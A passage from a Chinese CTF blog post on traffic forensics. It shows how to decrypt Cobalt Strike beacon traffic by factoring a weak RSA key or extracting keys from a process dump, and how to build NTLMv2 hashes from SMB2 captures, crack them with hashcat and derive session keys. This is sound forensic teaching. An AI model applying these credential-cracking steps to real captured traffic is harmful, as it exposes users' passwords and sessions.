+hex_key &#x3D; &quot;30819f300d06092a864886f70d010101050003818d00308189028181009cf1af3bffe8855bc30f10c1994ece58002e1795e76710f8b8a023006e1a6068943a4b5a6970d4a4f9ce942d29f3f032fb864a5b0389b6cd40de94ad67f13ea52221a2f94a1112b22bf4d4ca928f404b0b751a0a9c3d893062be8b31a90383b23a626b2c48bd2e5f80c0e7de7d6d5da81c53580a5730cf6b789e344b6284af6d0203010001&quot;
+der_data &#x3D; bytes.fromhex(hex_key)
+rsa_key &#x3D; RSA.import_key(der_data)
+n &#x3D; rsa_key.n
+e &#x3D; rsa_key.e
+pem_key &#x3D; rsa_key.export_key().decode()
+
+print(&quot;PEM 格式公钥：\n&quot;, pem_key)
+print(&quot;n &#x3D;&quot;, n)
+print(&quot;e &#x3D;&quot;, e)</code></pre>
+
+<p>得到</p>
+<p><img src="https://marin-1347161933.cos.ap-guangzhou.myqcloud.com/img/image-20260201161650-rrtp7dn.png" alt="image"></p>
+<p>然后用 yafu 分解 n</p>
+<pre class="line-numbers language-cmd" data-language="cmd" data-start="1"><code class="language-cmd">yafu-x64.exe factor(110209881007357893823335805800713195851127501725957565233140927957700204009298219831317940655870344979959172203765131703915110847527123581538957802617902884782216119145118127834057251159376653146542095451104320803312070357977411524497260098391204298785177487587770308799475139763729699721645361283357313642349)</code></pre>
+
+<p>得到 p 和 q 去求私钥</p>
+<pre class="line-numbers language-cmd" data-language="cmd" data-start="1"><code class="language-cmd">from Cryptodome.PublicKey import RSA
+from Cryptodome.Util.number import inverse
+
+p &#x3D; 7605291443685150594150190909345113655196508809219162555499789316232908573154196070425269090153291952292016936024761413150455793038505322748933150548026527
+q &#x3D; 7605291443685150594150190909345113655196508809219162555499789316232908573154196070425269090153291952292016936024761413150455793038505322748933150548026221
+e &#x3D; 65537 
+
+n &#x3D; p * q
+phi_n &#x3D; (p - 1) * (q - 1)
+
+d &#x3D; inverse(e, phi_n)
+key &#x3D; RSA.construct((n, e, d, p, q))
+
+private_pem &#x3D; key.export_key().decode()
+
+print(&quot;RSA私钥(PEM)：\n&quot;, private_pem)</code></pre></li>
+<li><p>使用工具从 dump 中提取加密密钥</p>
+<p>使用这个方法需要能获取到 <code>beacon</code> 进程的 dmp 文件</p>
+<p>通过 <code>cs-parse-traffic.py</code> 提取加密数据</p>
+<pre class="line-numbers language-cmd" data-language="cmd" data-start="1"><code class="language-cmd">python cs-parse-traffic.py -k unknown DESKTOP.pcapng</code></pre>
+
+<p>这里会获取很多数据，需要的是和 dmp 文件相关的内容，这里的 83 是对数据包 80 的响应，就有可能是 <code>TeamServer</code>​ 发送给 <code>Beacon</code> 的加密数据</p>
+<pre class="line-numbers language-cmd" data-language="cmd" data-start="1"><code class="language-cmd">Packet number: 83
+HTTP response (for request 80 GET)
+Length raw data: 48
+ac4cb985c04d084b0f77ed1b7745b23123abb198370ffcaedebf12c1f9de9b6fb6094a50a93af84cacd11a30b468dfbd
+
+Packet number: 83
+HTTP request 
+http:&#x2F;&#x2F;192.168.27.132:12580&#x2F;ca
+Length raw data: 48
+ac4cb985c04d084b0f77ed1b7745b23123abb198370ffcaedebf12c1f9de9b6fb6094a50a93af84cacd11a30b468dfbd</code></pre>
+
+<p>然后分析 dmp 文件</p>
+<pre class="line-numbers language-cmd" data-language="cmd" data-start="1"><code class="language-cmd">python cs-extract-key.py -t ac4cb985c04d084b0f77ed1b7745b23123abb198370ffcaedebf12c1f9de9b6fb6094a50a93af84cacd11a30b468dfbd 6492.dmp</code></pre>
+
+<p><img src="https://marin-1347161933.cos.ap-guangzhou.myqcloud.com/img/image-20260201161654-jbailsx.png" alt="image"></p>
+<p>获取到了密钥</p>
+<pre class="line-numbers language-cmd" data-language="cmd" data-start="1"><code class="language-cmd">35d34ac8778482751682514436d71e09:a6f4a04f8a6aa5ff27a5bcdd5ef3b9a7</code></pre>
+
+<p>然后使用提取的密钥进行解密</p>
+<pre class="line-numbers language-cmd" data-language="cmd" data-start="1"><code class="language-cmd">python cs-parse-traffic.py -k 35d34ac8778482751682514436d71e09:a6f4a04f8a6aa5ff27a5bcdd5ef3b9a7 DESKTOP.pcapng</code></pre>
+
+<p><img src="https://marin-1347161933.cos.ap-guangzhou.myqcloud.com/img/image-20260201161656-tgs712u.png" alt="image"></p>
+<p>就可以分析这些流量了</p>
+<ul>
+<li><p>上面这个是 4.x 版本的做法<br>3.x 就不用获取相关的密钥，可以直接对 dmp 文件分析</p>
+<pre class="line-numbers language-cmd" data-language="cmd" data-start="1"><code class="language-cmd">python cs-extract-key.py file.dmp</code></pre></li>
+</ul>
+</li>
+<li><p>利用 cs 泄露的私钥</p>
+<p>在分析 <code>beacon</code>​ 时可以判断公钥对应的私钥有没有泄露，如果泄露了，在使用 1768.py 工具时，私钥后会有一个 <code>has known private key</code> 那就可以直接解密出元数据</p>
+<pre class="line-numbers language-cmd" data-language="cmd" data-start="1"><code class="language-cmd">python cs-decrypt-metadata.py [cookie]</code></pre></li>
+<li><p>有 <code>.cobaltstrike.beacon_keys</code>获取私钥</p>
+<p>可以使用这个工具获取文件中的私钥</p>
+<p><a target="_blank" rel="noopener" href="https://github.com/Slzdude/cs-scripts">Slzdude&#x2F;cs-scripts: 研究CobaltStrike时的一些副产品</a></p>
+<p><a target="_blank" rel="noopener" href="https://github.com/WBGlIl/CS_Decrypt">github.com&#x2F;WBGlIl&#x2F;CS_Decrypt</a></p>
+</li>
+</ol>
+<p>‍</p>
+<h4 id="SMB2流量"><a href="#SMB2流量" class="headerlink" title="SMB2流量"></a>SMB2流量</h4><p>这个一般是解密 smb2 流量，要构造哈希文件，进行哈希爆破</p>
+<p>构造方法</p>
+<pre class="line-numbers language-none" data-start="1"><code class="language-none">username::domain::ServerChallenge:ntproofstr:不包含ntproofstr的ntlmv2_response值</code></pre>
+
+<p><code>ntproofstr</code>​ 一般是 <code>ntlmv2_response</code> 的前 32 位</p>
+<h5 id="例题"><a href="#例题" class="headerlink" title="例题"></a>例题</h5><p><strong>鹏程杯2024谍影重重5.0</strong></p>
+<p>拿到题目，查看流量，发现有 sm2 和 rdp 两种</p>
+<p>首先是 sm2 流量，这个是会话层和表示层，以及小部分应用层的协议<br>要解密 smb2 流量，就是要构造 hash 文件，进行 hash 爆破</p>
+<p><img src="https://marin-1347161933.cos.ap-guangzhou.myqcloud.com/img/image-20260201161703-kjgdtxj.png" alt="image"></p>
+<p>在流量中有两个用户，发现是 tom 登录成功，那么开始找对应的值</p>
+<p><img src="https://marin-1347161933.cos.ap-guangzhou.myqcloud.com/img/image-20260201161706-qgdcf9c.png" alt="image"></p>
+<pre class="line-numbers language-none" data-start="1"><code class="language-none">username : tom
+domain : .
+serverchallenge : c1dec53240124487
+ntproofstr(ntlm response 的前32位) : ca32f9b5b48c04ccfa96f35213d63d75
+不包含ntproofstr的ntlmv2_response值 ：010100000000000040d0731fb92adb01221434d6e24970170000000002001e004400450053004b0054004f0050002d004a0030004500450039004d00520001001e004400450053004b0054004f0050002d004a0030004500450039004d00520004001e004400450053004b0054004f0050002d004a0030004500450039004d00520003001e004400450053004b0054004f0050002d004a0030004500450039004d0052000700080040d0731fb92adb0106000400020000000800300030000000000000000100000000200000bd69d88e01f6425e6c1d7f796d55f11bd4bdcb27c845c6ebfac35b8a3acc42c20a001000000000000000000000000000000000000900260063006900660073002f003100370032002e00310036002e003100300035002e003100320039000000000000000000</code></pre>
+
+<p>构造的是</p>
+<pre class="line-numbers language-none" data-start="1"><code class="language-none">tom::.:c1dec53240124487:ca32f9b5b48c04ccfa96f35213d63d75:010100000000000040d0731fb92adb01221434d6e24970170000000002001e004400450053004b0054004f0050002d004a0030004500450039004d00520001001e004400450053004b0054004f0050002d004a0030004500450039004d00520004001e004400450053004b0054004f0050002d004a0030004500450039004d00520003001e004400450053004b0054004f0050002d004a0030004500450039004d0052000700080040d0731fb92adb0106000400020000000800300030000000000000000100000000200000bd69d88e01f6425e6c1d7f796d55f11bd4bdcb27c845c6ebfac35b8a3acc42c20a001000000000000000000000000000000000000900260063006900660073002f003100370032002e00310036002e003100300035002e003100320039000000000000000000</code></pre>
+
+<p>通过 hashcat 爆破出密码（用 john 也可以</p>
+<p><img src="https://marin-1347161933.cos.ap-guangzhou.myqcloud.com/img/image-20260201161710-w8mq62b.png" alt="image"></p>
+<p>到这里就可以解密了，直接在 ntlmssp 中加入密钥</p>
+<p><img src="https://marin-1347161933.cos.ap-guangzhou.myqcloud.com/img/image-20260201161731-s3n8ccv.png" alt="image"></p>
+<p>然后还有一种，是计算 session key 的</p>
+<p>使用网上的脚本</p>
+<pre class="line-numbers language-python" data-language="python" data-start="1"><code class="language-python">import hashlib
+from Cryptodome.Cipher import ARC4
+from Cryptodome.Cipher import DES
+from Cryptodome.Hash import MD4
+import hmac
+
+def generateEncryptedSessionKey(keyExchangeKey, exportedSessionKey):
+    cipher &#x3D; ARC4.new(keyExchangeKey)
+    sessionkey &#x3D; cipher.encrypt(exportedSessionKey)
+    print( sessionkey.hex())
+
+username  &#x3D; &quot;tom&quot;
+domain &#x3D;  &quot;.&quot;
+passw  &#x3D;  &quot;babygirl233&quot;
+NTproofstr &#x3D; &quot;ca32f9b5b48c04ccfa96f35213d63d75&quot;
+key &#x3D; &quot;5643a37f253b00b2f52df1afd48c1514&quot;
+
+username &#x3D; str(username).upper().encode(&#39;utf-16le&#39;)
+domain &#x3D; str(domain).upper().encode(&#39;utf-16le&#39;)
+
+passw &#x3D; passw.encode(&#39;utf-16le&#39;)
+
+hash1 &#x3D; hashlib.new(&#39;md4&#39;,passw)
+password &#x3D; hash1.digest()
+
+h &#x3D; hmac.new(password,digestmod&#x3D;hashlib.md5)
+h.update(username+domain)
+respNTkey &#x3D; h.digest()
+
+NTproofstr &#x3D; bytes.fromhex(NTproofstr)
+h &#x3D; hmac.new(respNTkey,digestmod&#x3D;hashlib.md5)
+h.update(NTproofstr)
+KeyExchKey &#x3D; h.digest()
+
+RessKey &#x3D; generateEncryptedSessionKey(KeyExchKey, bytes.fromhex(key))</code></pre>
+
+<p>得到 <code>a3abe4d64394909a641062342ffe291b</code>，这里因为 wireshark 中的大小端问题，所以要修改</p>
+<p><img src="https://marin-1347161933.cos.ap-guangzhou.myqcloud.com/img/image-20260201161735-lwd81sl.png" alt="image"></p>
+<p><img src="https://marin-1347161933.cos.ap-guangzhou.myqcloud.com/img/image-20260201161734-vm3hzcc.png" alt="image"></p>
+<p>然后就可以提出 sm2 的文件</p>
+<p><img src="https://marin-1347161933.cos.ap-guangzhou.myqcloud.com/img/image-20260201161738-j053fe4.png" alt="image"></p>
+<p>flag.7z 是有密码的，所以要找，应该就是 rdp 的流量解密</p>
+<p>然后导出证书，但是 wireshark 的 tls 解密不支持 pfx，所以要先修改为 pem 格式</p>
+<pre class="line-numbers language-bash" data-language="bash" data-start="1"><code class="language-bash">openssl pkcs12 -in 1.pfx -out rdp.pem -nodes</code></pre>
+
+<p><img src="https://marin-1347161933.cos.ap-guangzhou.myqcloud.com/img/image-20260201161740-hca4gvr.png" alt="image"></p>
+<p>先用 openssl 转换一下格式，因为出题人应该是用 mimikatz 一把梭，所以密码就是 mimikatz，到现在就已经解密完了</p>
+<p>‍</p>
+<h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/wgd-elwood/p/16845903.html">COTP协议–电脑与PLC通信之表示层 - wgd_elwood - 博客园</a></p>
+<p><a target="_blank" rel="noopener" href="https://goodlunatic.github.io/posts/5422d65/#vpn%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90">Misc-Network Traffic Analysis - ⚡Lunatic BLOG⚡</a></p>
+<p><a target="_blank" rel="noopener" href="https://nnnpc.github.io/2024/04/16/CS%E6%B5%81%E9%87%8F%E6%B5%85%E6%9E%90/">（●´3｀●）やれやれだぜ</a></p>
+<p><a target="_blank" rel="noopener" href="http://ta0.fun/posts/a70a62d9/">CobaltStrike4.0流量分析 | ta0的小站</a>		</p>
+<p><a target="_blank" rel="noopener" href="https://www.secrss.com/articles/35756">通过进程内存提取密钥解密Cobalt Strike流量 - 安全内参 | 决策者的网络安全知识库</a></p>
+
+                
+            </div>
+            <hr/>
+
+            
+
+    <div class="reprint" id="reprint-statement">
+        
+            <div class="reprint__author">
+                <span class="reprint-meta" style="font-weight: bold;">
+                    <i class="fas fa-user">
+                        文章作者:
+                    </i>
+                </span>
+                <span class="reprint-info">
+                    <a href="/about" rel="external nofollow noreferrer">Marin</a>
+                </span>
+            </div>
+            <div class="reprint__type">
+                <span class="reprint-meta" style="font-weight: bold;">
+                    <i class="fas fa-link">
+                        文章链接:
+                    </i>
+                </span>
+                <span class="reprint-info">
+                    <a href="https://wwwmarin.xyz/2024/12/12/liu-liang-fen-xi/">https://wwwmarin.xyz/2024/12/12/liu-liang-fen-xi/</a>
+                </span>
+            </div>
+            <div class="reprint__notice">
+                <span class="reprint-meta" style="font-weight: bold;">
+                    <i class="fas fa-copyright">
+                        版权声明:
+                    </i>
+                </span>
+                <span class="reprint-info">
+                    本博客所有文章除特別声明外，均采用
+                    <a href="https://creativecommons.org/licenses/by/4.0/deed.zh" rel="external nofollow noreferrer" target="_blank">CC BY 4.0</a>
+                    许可协议。转载请注明来源
+                    <a href="/about" target="_blank">Marin</a>
+                    !
+                </span>
+            </div>
+        
+    </div>
+
+    <script async defer>
+      document.addEventListener("copy", function (e) {
+        let toastHTML = '<span>复制成功，请遵循本文的转载规则</span><button class="btn-flat toast-action" onclick="navToReprintStatement()" style="font-size: smaller">查看</a>';
+        M.toast({html: toastHTML})
+      });
+
+      function navToReprintStatement() {
+        $("html, body").animate({scrollTop: $("#reprint-statement").offset().top - 80}, 800);
+      }
+    </script>
+
+
+
+            <div class="tag_share" style="display: block;">
+                <div class="post-meta__tag-list" style="display: inline-block;">
+                    
+                        <div class="article-tag">
+                            
+                                <a href="/tags/misc/">
+                                    <span class="chip bg-color">misc</span>
+                                </a>
+                            
+                                <a href="/tags/%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/">
+                                    <span class="chip bg-color">流量分析</span>
+                                </a>
+                            
+                        </div>
+                    
+                </div>
+                <div class="post_share" style="zoom: 80%; width: fit-content; display: inline-block; float: right; margin: -0.15rem 0;">
+                    <link rel="stylesheet" type="text/css" href="/libs/share/css/share.min.css">
+<div id="article-share">
+
+    
+    <div class="social-share" data-sites="twitter,facebook,google,qq,qzone,wechat,weibo,douban,linkedin" data-wechat-qrcode-helper="<p>微信扫一扫即可分享！</p>"></div>
+    <script src="/libs/share/js/social-share.min.js"></script>
+    
+
+    
+
+</div>
+
+                </div>
+            </div>
+            
+                <div id="reward">
+    <a href="#rewardModal" class="reward-link modal-trigger btn-floating btn-medium waves-effect waves-light red">赏</a>
+
+    <!-- Modal Structure -->
+    <div id="rewardModal" class="modal">
+        <div class="modal-content">
+            <a class="close modal-close"><i class="fas fa-times"></i></a>
+            <h4 class="reward-title">你的赏识是我前进的动力</h4>
+            <div class="reward-content">
+                <div class="reward-tabs">
+                    <ul class="tabs row">
+                        <li class="tab col s6 alipay-tab waves-effect waves-light"><a href="#alipay">支付宝</a></li>
+                        <li class="tab col s6 wechat-tab waves-effect waves-light"><a href="#wechat">微 信</a></li>
+                    </ul>
+                    <div id="alipay">
+                        <img src="/medias/reward/alipay.jpg" class="reward-img" alt="支付宝打赏二维码">
+                    </div>
+                    <div id="wechat">
+                        <img src="/medias/reward/wechat.png" class="reward-img" alt="微信打赏二维码">
+                    </div>
+                </div>
+            </div>
+        </div>
+    </div>
+</div>
+
+<script>
+    $(function () {
+        $('.tabs').tabs();
+    });
+</script>
+
+            
+        </div>
+    </div>
+
+    
+
+    
+
+    
+
+    
+
+    
+
+    
+
+    
+
+    
+
+    
+
+<article id="prenext-posts" class="prev-next articles">
+    <div class="row article-row">
+        
+        <div class="article col s12 m6" data-aos="fade-up">
+            <div class="article-badge left-badge text-color">
+                <i class="fas fa-chevron-left"></i>&nbsp;上一篇</div>
+            <div class="card">
+                <a href="/2025/03/20/mimikatz/">
+                    <div class="card-image">
+                        
+                        <img src="https://marin-1347161933.cos.ap-guangzhou.myqcloud.com/img/3030386_95467139_p0.jpg" class="responsive-img" alt="mimikatz 学习">
+                        
+                        <span class="card-title">mimikatz 学习</span>
+                    </div>
+                </a>
+                <div class="card-content article-content">
+                    <div class="summary block-with-text">
+                        
+                            
+                        
+                    </div>
+                    <div class="publish-info">
+                        <span class="publish-date">
+                            <i class="far fa-clock fa-fw icon-date"></i>2025-03-20
+                        </span>
+                        <span class="publish-author">
+                            
+                            <i class="fas fa-bookmark fa-fw icon-category"></i>
+                            
+                            <a href="/categories/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/" class="post-category">
+                                    内网渗透
+                                </a>
+                            
+                            
+                        </span>
+                    </div>
+                </div>
+                
+                <div class="card-action article-tags">
+                    
+                    <a href="/tags/%E5%B7%A5%E5%85%B7/">
+                        <span class="chip bg-color">工具</span>
+                    </a>
+                    
+                    <a href="/tags/%E6%B8%97%E9%80%8F/">
+                        <span class="chip bg-color">渗透</span>
+                    </a>
+                    
+                </div>
+                
+            </div>
+        </div>
+        
+        
+        <div class="article col s12 m6" data-aos="fade-up">
+            <div class="article-badge right-badge text-color">
+                本篇&nbsp;<i class="far fa-dot-circle"></i>
+            </div>
+            <div class="card">
+                <a href="/2024/12/12/liu-liang-fen-xi/">
+                    <div class="card-image">
+                        
+                        <img src="https://marin-1347161933.cos.ap-guangzhou.myqcloud.com/img/bdf89e55e2c171c4da83842d5db0c9e0.jpg" class="responsive-img" alt="流量分析">
+                        
+                        <span class="card-title">流量分析</span>
+                    </div>
+                </a>
+                <div class="card-content article-content">
+                    <div class="summary block-with-text">
+                        
+                            
+                        
+                    </div>
+                    <div class="publish-info">
+                            <span class="publish-date">
+                                <i class="far fa-clock fa-fw icon-date"></i>2024-12-12
+                            </span>
+                        <span class="publish-author">
+                            
+                            <i class="fas fa-bookmark fa-fw icon-category"></i>
+                            
+                            <a href="/categories/MISC/" class="post-category">
+                                    MISC
+                                </a>
+                            
+                            
+                        </span>
+                    </div>
+                </div>
+
+                
+                <div class="card-action article-tags">
+                    
+                    <a href="/tags/misc/">
+                        <span class="chip bg-color">misc</span>
+                    </a>
+                    
+                    <a href="/tags/%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/">
+                        <span class="chip bg-color">流量分析</span>
+                    </a>
+                    
+                </div>
+                
+            </div>
+        </div>
+        
+    </div>
+</article>
+
+</div>
+
+
+
+<!-- 代码块功能依赖 -->
+<script type="text/javascript" src="/libs/codeBlock/codeBlockFuction.js"></script>
+
+
+  <!-- 是否加载使用自带的 prismjs. -->
+  <script type="text/javascript" src="/libs/prism/prism.min.js"></script>
+
+
+<!-- 代码语言 -->
+
+<script type="text/javascript" src="/libs/codeBlock/codeLang.js"></script>
+
+
+<!-- 代码块复制 -->
+
+<script type="text/javascript" src="/libs/codeBlock/codeCopy.js"></script>
+
+
+<!-- 代码块收缩 -->
+
+<script type="text/javascript" src="/libs/codeBlock/codeShrink.js"></script>
+
+
+
+    </div>
+    <div id="toc-aside" class="expanded col l3 hide-on-med-and-down">
+        <div class="toc-widget card" style="background-color: white;">
+            <div class="toc-title"><i class="far fa-list-alt"></i>&nbsp;&nbsp;目录</div>
+            <div id="toc-content"></div>
+        </div>
+    </div>
+</div>
+
+<!-- TOC 悬浮按钮. -->
+
+<div id="floating-toc-btn" class="hide-on-med-and-down">
+    <a class="btn-floating btn-large bg-color">
+        <i class="fas fa-list-ul"></i>
+    </a>
+</div>
+
+
+<script src="/libs/tocbot/tocbot.min.js"></script>
+<script>
+    $(function () {
+        tocbot.init({
+            tocSelector: '#toc-content',
+            contentSelector: '#articleContent',
+            headingsOffset: -($(window).height() * 0.4 - 45),
+            collapseDepth: Number('0'),
+            headingSelector: 'h2, h3, h4, h5, h6'
+        });
+
+        // Set scroll toc fixed.
+        let tocHeight = parseInt($(window).height() * 0.4 - 64);
+        let $tocWidget = $('.toc-widget');
+        $(window).scroll(function () {
+            let scroll = $(window).scrollTop();
+            /* add post toc fixed. */
+            if (scroll > tocHeight) {
+                $tocWidget.addClass('toc-fixed');
+            } else {
+                $tocWidget.removeClass('toc-fixed');
+            }
+        });
+
+        
+        /* 修复文章卡片 div 的宽度. */
+        let fixPostCardWidth = function (srcId, targetId) {
+            let srcDiv = $('#' + srcId);
+            if (srcDiv.length === 0) {
+                return;
+            }
+
+            let w = srcDiv.width();
+            if (w >= 450) {
+                w = w + 21;
+            } else if (w >= 350 && w < 450) {
+                w = w + 18;
+            } else if (w >= 300 && w < 350) {
+                w = w + 16;
+            } else {
+                w = w + 14;
+            }
+            $('#' + targetId).width(w);
+        };
+
+        // 切换TOC目录展开收缩的相关操作.
+        const expandedClass = 'expanded';
+        let $tocAside = $('#toc-aside');
+        let $mainContent = $('#main-content');
+        $('#floating-toc-btn .btn-floating').click(function () {
+            if ($tocAside.hasClass(expandedClass)) {
+                $tocAside.removeClass(expandedClass).hide();
+                $mainContent.removeClass('l9');
+            } else {
+                $tocAside.addClass(expandedClass).show();
+                $mainContent.addClass('l9');
+            }
+            fixPostCardWidth('artDetail', 'prenext-posts');
+        });
+        
+    });
+</script>
+
+    
+
+</main>
+
+
+
+
+    <footer class="page-footer bg-color">
+    
+
+    <div class="container row center-align"
+         style="margin-bottom: 0px !important;">
+        <div class="col s12 m8 l8 copy-right">
+            Copyright&nbsp;&copy;
+            
+                <span id="year">2019-2026</span>
+            
+            <a href="/about" target="_blank">Marin</a>
+            |&nbsp;Powered by&nbsp;<a href="https://hexo.io/" target="_blank">Hexo</a>
+            |&nbsp;Theme&nbsp;<a href="https://github.com/blinkfox/hexo-theme-matery" target="_blank">Matery</a>
+            
+            <br>
+            
+            
+            
+                
+            
+            
+                <span id="busuanzi_container_site_pv">
+                &nbsp;|&nbsp;<i class="far fa-eye"></i>&nbsp;总访问量:&nbsp;
+                    <span id="busuanzi_value_site_pv" class="white-color"></span>
+            </span>
+            
+            
+                <span id="busuanzi_container_site_uv">
+                &nbsp;|&nbsp;<i class="fas fa-users"></i>&nbsp;总访问人数:&nbsp;
+                    <span id="busuanzi_value_site_uv" class="white-color"></span>
+            </span>
+            
+            <br>
+
+            <!-- 运行天数提醒. -->
+            
+            <br>
+            
+        </div>
+        <div class="col s12 m4 l4 social-link social-statis">
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+</div>
+    </div>
+</footer>
+
+<div class="progress-bar"></div>
+
+
+    <!-- 搜索遮罩框 -->
+<div id="searchModal" class="modal">
+    <div class="modal-content">
+        <div class="search-header">
+            <span class="title"><i class="fas fa-search"></i>&nbsp;&nbsp;搜索</span>
+            <input type="search" id="searchInput" name="s" placeholder="请输入搜索的关键字"
+                   class="search-input">
+        </div>
+        <div id="searchResult"></div>
+    </div>
+</div>
+
+<script type="text/javascript">
+$(function () {
+    var searchFunc = function (path, search_id, content_id) {
+        'use strict';
+        $.ajax({
+            url: path,
+            dataType: "xml",
+            success: function (xmlResponse) {
+                // get the contents from search data
+                var datas = $("entry", xmlResponse).map(function () {
+                    return {
+                        title: $("title", this).text(),
+                        content: $("content", this).text(),
+                        url: $("url", this).text()
+                    };
+                }).get();
+                var $input = document.getElementById(search_id);
+                var $resultContent = document.getElementById(content_id);
+                $input.addEventListener('input', function () {
+                    var str = '<ul class=\"search-result-list\">';
+                    var keywords = this.value.trim().toLowerCase().split(/[\s\-]+/);
+                    $resultContent.innerHTML = "";
+                    if (this.value.trim().length <= 0) {
+                        return;
+                    }
+                    // perform local searching
+                    datas.forEach(function (data) {
+                        var isMatch = true;
+                        var data_title = data.title.trim().toLowerCase();
+                        var data_content = data.content.trim().replace(/<[^>]+>/g, "").toLowerCase();
+                        var data_url = data.url;
+                        data_url = data_url.indexOf('/') === 0 ? data.url : '/' + data_url;
+                        var index_title = -1;
+                        var index_content = -1;
+                        var first_occur = -1;
+                        // only match artiles with not empty titles and contents
+                        if (data_title !== '' && data_content !== '') {
+                            keywords.forEach(function (keyword, i) {
+                                index_title = data_title.indexOf(keyword);
+                                index_content = data_content.indexOf(keyword);
+                                if (index_title < 0 && index_content < 0) {
+                                    isMatch = false;
+                                } else {
+                                    if (index_content < 0) {
+                                        index_content = 0;
+                                    }
+                                    if (i === 0) {
+                                        first_occur = index_content;
+                                    }
+                                }
+                            });
+                        }
+                        // show search results
+                        if (isMatch) {
+                            str += "<li><a href='" + data_url + "' class='search-result-title'>" + data_title + "</a>";
+                            var content = data.content.trim().replace(/<[^>]+>/g, "");
+                            if (first_occur >= 0) {
+                                // cut out 100 characters
+                                var start = first_occur - 20;
+                                var end = first_occur + 80;
+                                if (start < 0) {
+                                    start = 0;
+                                }
+                                if (start === 0) {
+                                    end = 100;
+                                }
+                                if (end > content.length) {
+                                    end = content.length;
+                                }
+                                var match_content = content.substr(start, end);
+                                // highlight all keywords
+                                keywords.forEach(function (keyword) {
+                                    var regS = new RegExp(keyword, "gi");
+                                    match_content = match_content.replace(regS, "<em class=\"search-keyword\">" + keyword + "</em>");
+                                });
+
+                                str += "<p class=\"search-result\">" + match_content + "...</p>"
+                            }
+                            str += "</li>";
+                        }
+                    });
+                    str += "</ul>";
+                    $resultContent.innerHTML = str;
+                });
+            }
+        });
+    };
+
+    searchFunc('/search.xml', 'searchInput', 'searchResult');
+});
+</script>
+
+    <!-- 白天和黑夜主题 -->
+<div class="stars-con">
+    <div id="stars"></div>
+    <div id="stars2"></div>
+    <div id="stars3"></div>  
+</div>
+
+<script>
+    function switchNightMode() {
+        $('<div class="Cuteen_DarkSky"><div class="Cuteen_DarkPlanet"></div></div>').appendTo($('body')),
+        setTimeout(function () {
+            $('body').hasClass('DarkMode') 
+            ? ($('body').removeClass('DarkMode'), localStorage.setItem('isDark', '0'), $('#sum-moon-icon').removeClass("fa-sun").addClass('fa-moon')) 
+            : ($('body').addClass('DarkMode'), localStorage.setItem('isDark', '1'), $('#sum-moon-icon').addClass("fa-sun").removeClass('fa-moon')),
+            
+            setTimeout(function () {
+            $('.Cuteen_DarkSky').fadeOut(1e3, function () {
+                $(this).remove()
+            })
+            }, 2e3)
+        })
+    }
+</script>
+
+    <!-- 回到顶部按钮 -->
+<div id="backTop" class="top-scroll">
+    <a class="btn-floating btn-large waves-effect waves-light" href="#!">
+        <i class="fas fa-arrow-up"></i>
+    </a>
+</div>
+
+
+    <script src="/libs/materialize/materialize.min.js"></script>
+    <script src="/libs/masonry/masonry.pkgd.min.js"></script>
+    <script src="/libs/aos/aos.js"></script>
+    <script src="/libs/scrollprogress/scrollProgress.min.js"></script>
+    <script src="/libs/lightGallery/js/lightgallery-all.min.js"></script>
+    <script src="/js/matery.js"></script>
+
+    
+
+    
+    
+    
+
+    <!-- 雪花特效 -->
+    
+
+    <!-- 鼠标星星特效 -->
+    
+
+     
+        <script src="https://ssl.captcha.qq.com/TCaptcha.js"></script>
+        <script src="/libs/others/TencentCaptcha.js"></script>
+        <button id="TencentCaptcha" data-appid="xxxxxxxxxx" data-cbfn="callback" type="button" hidden></button>
+    
+
+    <!-- Baidu Analytics -->
+
+    <!-- Baidu Push -->
+
+<script>
+    (function () {
+        var bp = document.createElement('script');
+        var curProtocol = window.location.protocol.split(':')[0];
+        if (curProtocol === 'https') {
+            bp.src = 'https://zz.bdstatic.com/linksubmit/push.js';
+        } else {
+            bp.src = 'http://push.zhanzhang.baidu.com/push.js';
+        }
+        var s = document.getElementsByTagName("script")[0];
+        s.parentNode.insertBefore(bp, s);
+    })();
+</script>
+
+    
+    
+    <script async src="/libs/others/busuanzi.pure.mini.js"></script>
+    
+
+    
+
+    
+
+    <!--腾讯兔小巢-->
+    
+    
+
+    
+
+    
+
+    
+    <script src="/libs/instantpage/instantpage.js" type="module"></script>
+    
+
+</body>
+
+</html>
